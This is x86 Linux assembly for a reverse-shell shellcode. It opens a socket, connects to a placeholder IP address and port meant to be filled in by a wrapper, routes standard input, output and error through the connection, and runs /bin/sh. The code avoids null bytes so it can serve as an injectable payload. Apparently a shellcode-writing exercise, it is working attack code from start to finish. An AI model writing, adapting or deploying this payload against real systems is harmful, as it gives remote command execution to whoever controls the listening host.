global _start

section .text

_start:

socket:

xor eax,eax
push eax ;protocol
inc eax
push eax ;SOCK_STREAM
inc eax
push eax ;AF_INET

mov al, 0x66 ;sys_socketcall
mov ebx, [esp+4] ; socket(AF_INET, SOCK_STREAM, 0)
mov ecx, esp ; socket args
int 0x80

mov edi, eax

; file descriptor now in eax

bind:

push 0x11223344 ;ip replace me in wrapper
xor ebx,ebx ;zero out ebx

;AF_INET (0002) and sin_port ffff
;push 0xcdab0002 <-- zero bytes
mov cx, 0xcccc ; port number, replace me in wrapper
shl ecx, 0x10
mov cl, 0x2 ; <-- AF_INET
push ecx

;setup arguments
mov [esp-8],esp ;load the sockaddr struct address  on the stack at correct offset

push 0x10 ; size of sockaddr_in is 16 bytes

sub esp,0x4 ; correct the stack offset because of preload of sockaddr_in struct

push eax ; file descriptor

mov al, 0x66 ;sys_socketcall
mov bl, 0x3 ; connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
mov ecx, esp ;arguments
int 0x80

dup2:
xor ecx, ecx
mov eax, edi ;eax=fd 
jump:

mov al, 0x3f ; dup2 sys call
int 0x80 ;int dup2(int oldfd, int newfd);
inc ecx ;
cmp ecx,0x2 ; call dup for stdin,stdout,stderr
jle jump

execve:
xor eax,eax
push dword [esp-8] ; referencing null being pushed below
push eax ;ends /bin//sh with null and argv and envp as null arguments

mov edx, esp; envp
mov ecx, esp ; argv
push 0x68732f2f;//sh
push 0x6e69622f;/bin
mov ebx, esp
mov al, 0xb ;; execve(const char *filename, char *const argv[],char *const envp[]);
int 0x80
